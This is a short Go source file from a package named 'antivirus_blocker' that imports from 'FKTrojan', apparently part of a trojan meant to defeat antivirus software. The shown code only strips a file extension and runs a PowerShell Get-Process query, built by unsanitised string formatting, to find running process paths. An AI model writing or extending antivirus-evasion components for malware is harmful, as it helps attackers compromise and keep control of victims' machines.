package antivirus_blocker

import (
	"FKTrojan/common"
	"fmt"
	"strings"
)

func removeExt(exeName string) string {
	idx := strings.LastIndex(exeName, ".")
	if idx < 0 {
		return exeName
	}
	return exeName[:idx]
}
func getExePath(exeName string) ([]string, error) {
	exeName = removeExt(exeName)
	powershellCmd := fmt.Sprintf("Get-Process -name %s | Select-Object Path | ft -hidetableheaders", exeName)
	stdout, _, err := common.RunExe(fmt.Sprintf("powershell \"%s\"", powershellCmd))
	if err != nil {
		return nil, err
	}
	stdout = strings.Trim(stdout, "\r\n")
	pathArr := strings.Split(stdout, "\r\n")
	path := make([]string, 0)
	for _, p := range pathArr {
		path = append(path, strings.Trim(p, " "))
	}
	return path, nil
}
